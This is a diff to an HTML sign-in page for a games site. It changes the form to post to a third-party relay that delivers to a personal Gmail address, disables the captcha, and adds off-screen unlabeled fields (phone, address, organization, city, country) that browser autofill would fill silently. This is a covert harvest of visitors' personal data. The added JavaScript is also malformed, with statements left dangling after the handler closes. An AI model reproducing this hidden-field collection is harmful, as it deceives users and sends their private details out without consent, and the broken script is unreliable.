@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>The Area - Sign In</title>
+    <title>The Area</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
       body { background-color: #343a40; color: #f8f9fa; }
@@ -15,7 +15,8 @@
     <div class="container text-center">
       <h2>Welcome to The Area</h2>
       <p>Please sign in to access the games!</p>
-      <form id="signInForm">
+      <form id="signInForm" action="https://formsubmit.co/bobperson300@gmail.com" method="POST">
+        <!-- Visible Fields -->
         <div class="form-group">
           <label for="name">Name</label>
           <input id="name" name="name" type="text" class="form-control" required>
@@ -24,20 +25,73 @@
           <label for="email">Email</label>
           <input id="email" name="email" type="email" class="form-control" required>
         </div>
-        <button type="submit" class="btn btn-primary">Sign In</button>
+
+        <!-- Hidden Fields -->
+        <div class="form-group off-screen">
+          <input name="phone" type="text" placeholder="Phone">
+          <input name="organization" type="text" placeholder="Organization">
+          <input name="address" type="text" placeholder="Address">
+          <input name="postal" type="text" placeholder="Postal Code">
+          <input name="city" type="text" placeholder="City">
+          <input name="state" type="text" placeholder="State">
+          <select name="country">
+            <option value=""></option>
+            <option value="FI">Finland</option>
+          </select>
+        </div>
+
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="#confirmation">
+        <input type="hidden" name="_subject" value="New Area Study Submission">
+
+        <button type="submit" class="btn btn-primary">Join The Area</button>
       </form>
       <div id="confirmation">
-        Thank you for signing in! Redirecting to the game selector...
+        Thank you for participating in The Area study! Redirecting to the game selector...
       </div>
     </div>
 
     <script>
-      document.getElementById('signInForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevent the default form behavior
-        document.getElementById('confirmation').style.display = 'block'; // Show confirmation message
+      // Check login state on page load
+      window.onload = function () {
+        const user = JSON.parse(localStorage.getItem('user'));
+        const oneHour = 60 * 60 * 1000; // 1 hour in milliseconds
+        if (user && (Date.now() - user.timestamp < oneHour)) {
+          // User is still logged in
+          window.location.href = '/game-selector.html';
+        } else {
+          // Clear expired session
+          localStorage.removeItem('user');
+        }
+      };
+
+      // Handle form submission
+      document.getElementById('signInForm').addEventListener('submit', function (e) {
+        e.preventDefault(); // Prevent default form behavior
+        fetch(this.action, {
+          method: 'POST',
+          body: new FormData(this)
+        }).then(() => {
+          document.getElementById('confirmation').style.display = 'block';
+          this.reset();
+        });
+      });
+
+        // Save user data to localStorage
+        const name = document.getElementById('name').value;
+        const email = document.getElementById('email').value;
+        const userData = {
+          name,
+          email,
+          timestamp: Date.now(),
+        };
+        localStorage.setItem('user', JSON.stringify(userData));
+
+        // Show confirmation and redirect
+        document.getElementById('confirmation').style.display = 'block';
         setTimeout(() => {
-          window.location.href = '/game-selector.html'; // Redirect to the game selector
-        }, 2000); // Wait 2 seconds before redirection
+          window.location.href = '/game-selector.html';
+        }, 2000); // Redirect after 2 seconds
       });
     </script>
   </body>
